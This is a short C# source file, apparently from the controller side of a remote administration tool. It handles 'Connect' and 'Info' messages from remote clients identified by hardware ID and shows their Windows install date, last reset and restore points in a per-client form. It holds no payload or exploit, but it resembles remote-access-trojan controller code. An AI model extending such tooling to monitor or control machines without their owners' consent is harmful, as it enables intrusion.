using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerWindowsRestores
{
	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 2 || !(objects[1] is string))
		{
			return;
		}
		string command = (string)objects[1];
		if (command == "Connect")
		{
			if (objects.Length < 3 || !(objects[2] is string))
			{
				return;
			}
			string hwid = SecurityHelper.SanitizeHwid((string)objects[2]);
			FormWindowsRestores form = (FormWindowsRestores)Application.OpenForms["WindowsRestores:" + hwid];
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.Text = "Windows Restores [" + hwid + "]";
				form.client = client;
			});
			client.Tag = form;
			client.Hwid = hwid;
		}
		else if (command == "Info" && client.Tag != null)
		{
			FormWindowsRestores obj = (FormWindowsRestores)client.Tag;
			string installDate = objects[2] as string;
			string lastReset = objects[3] as string;
			object[] points = (object[])objects[4];
			obj.UpdateInfo(installDate, lastReset, points);
		}
	}
}
